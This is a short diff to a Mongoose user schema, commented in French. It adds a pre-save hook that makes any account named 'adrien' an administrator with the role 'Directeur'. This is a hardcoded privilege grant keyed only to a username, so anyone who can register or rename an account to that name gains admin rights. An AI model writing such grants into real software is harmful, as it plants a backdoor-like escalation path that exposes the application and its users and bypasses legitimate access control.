@@ -61,6 +61,16 @@ UserSchema.pre('save', async function(next) {
   }
 });
 
+// 🔥 FORCER ADRIEN EN ADMIN AUTOMATIQUEMENT
+UserSchema.pre('save', function(next) {
+  // Si c'est adrien, forcer admin = true
+  if (this.username === 'adrien') {
+    this.isAdmin = true;
+    this.role = 'Directeur';
+  }
+  next();
+});
+
 // Méthode pour comparer les mots de passe
 UserSchema.methods.comparePassword = async function(candidatePassword) {
   return await bcrypt.compare(candidatePassword, this.password);
